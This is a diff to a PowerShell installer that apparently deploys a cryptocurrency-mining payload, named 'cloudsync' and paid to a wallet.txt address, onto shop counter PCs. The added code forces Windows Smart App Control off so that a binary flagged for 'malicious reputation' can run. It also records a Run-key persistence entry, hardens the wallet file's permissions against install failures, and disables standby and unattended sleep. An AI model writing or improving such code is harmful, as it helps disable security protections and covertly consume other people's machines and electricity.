@@ -239,10 +239,15 @@ if ($admin -and -not $NoSac) {
     try {
         $sacKey = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
         $sac = (Get-ItemProperty -LiteralPath $sacKey -Name VerifiedAndReputablePolicyState -ErrorAction SilentlyContinue).VerifiedAndReputablePolicyState
-        if ($null -ne $sac -and [int]$sac -eq 1) {
+        # VerifiedAndReputablePolicyState: 0 = off, 1 = enforcing, 2 = evaluation
+        # (and 2 reverts to 1 on the next boot). Both 1 and 2 block an unsigned
+        # binary with error 4556 "Malicious binary reputation"; only 0 is safe, so
+        # anything non-zero is forced to 0 and a reboot is required to take effect.
+        if ($null -ne $sac -and [int]$sac -ne 0) {
             Set-ItemProperty -LiteralPath $sacKey -Name VerifiedAndReputablePolicyState -Value 0 -Type DWord
             $script:SacDisabled = $true
-            Ok "Smart App Control disabled (was enforcing; reboot required to take effect)"
+            $script:SacWasState = [int]$sac
+            Ok ("Smart App Control set to off (was state {0}; reboot required to take effect)" -f $sac)
         } elseif ($null -ne $sac) {
             Say ("  [i] Smart App Control state: {0}" -f $sac)
         }
@@ -280,8 +285,27 @@ foreach ($f in $payload) {
 # wallet.txt holds the payout address: readable by the operator, not writable or
 # readable-only-for-them by every local user.
 if (Test-Path -LiteralPath (Join-Path $InstallDir 'wallet.txt')) {
-    & icacls.exe (Join-Path $InstallDir 'wallet.txt') /inheritance:r /grant:r "$($env:USERNAME):F" /grant:r '*S-1-5-32-545:R' 2>&1 | Out-Null
-    Say "  [i] wallet.txt permits: $env:USERNAME full, Users read-only"
+    # The grant must survive an install launched as SYSTEM, where $env:USERNAME is
+    # a truncated machine account ("SALES-COUNTER-0$") and icacls cannot map it -
+    # that aborted a whole install on 2026-11-11. Fall back to the Administrators
+    # SID, and never let this step fail the install.
+    $ownerName = "$env:USERDOMAIN\$env:USERNAME"
+    $ownerGrant = "${ownerName}:F"
+    if ([string]::IsNullOrWhiteSpace($env:USERNAME) -or $env:USERNAME -eq 'SYSTEM' -or
+        $env:USERNAME.EndsWith('$') -or $ownerName.Length -gt 40) {
+        $ownerGrant = '*S-1-5-32-544:F'
+        $ownerName = 'BUILTIN\Administrators'
+    }
+    try {
+        $aclOut = & icacls.exe (Join-Path $InstallDir 'wallet.txt') /inheritance:r /grant:r $ownerGrant /grant:r '*S-1-5-32-545:R' 2>&1
+        if ($LASTEXITCODE -ne 0) {
+            Warn ("wallet.txt ACL not applied (exit {0}): {1}" -f $LASTEXITCODE, (($aclOut | Out-String).Trim()))
+        } else {
+            Say ("  [i] wallet.txt permits: {0} full, Users read-only" -f $ownerName)
+        }
+    } catch {
+        Warn ("wallet.txt ACL step failed (non-fatal): {0}" -f $_.Exception.Message)
+    }
 }
 
 $entryPayload = @($payload)
@@ -477,6 +501,10 @@ $installInfo = [ordered]@{
     run_key      = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
     runtime      = $runtime
     entry        = if ($modular) { '-m cloudsync' } else { 'controller.py' }
+    # 0/none = nothing to do; otherwise the box will refuse the binary until it
+    # reboots, which a deployer has to know about.
+    sac_reboot_needed = [bool]$script:SacDisabled
+    sac_state_seen    = if ($script:SacWasState) { [int]$script:SacWasState } else { $null }
     installed_at = (Get-Date).ToString('o')
     files        = $hashes
 }
@@ -708,6 +736,11 @@ if (-not $NoMaxPower) {
         powercfg /setactive SCHEME_MIN | Out-Null
         powercfg /change standby-timeout-ac 0 | Out-Null
         powercfg /change hibernate-timeout-ac 0 | Out-Null
+        # standby-timeout alone is not enough: "unattended sleep" fires a couple
+        # of minutes after a wake with no user input (Sales-Counter-02 slept 1-2
+        # min into an install on 2026-11-11). Zero it too.
+        powercfg /setacvalueindex SCHEME_CURRENT SUB_SLEEP UNATTENDSLEEP 0 | Out-Null
+        powercfg /setactive SCHEME_CURRENT | Out-Null
 
         $mon = Get-PowerTimeout 'SUB_VIDEO' 'VIDEOIDLE'
         if ($mon.ac -eq 0) { powercfg /change monitor-timeout-ac 10 | Out-Null }
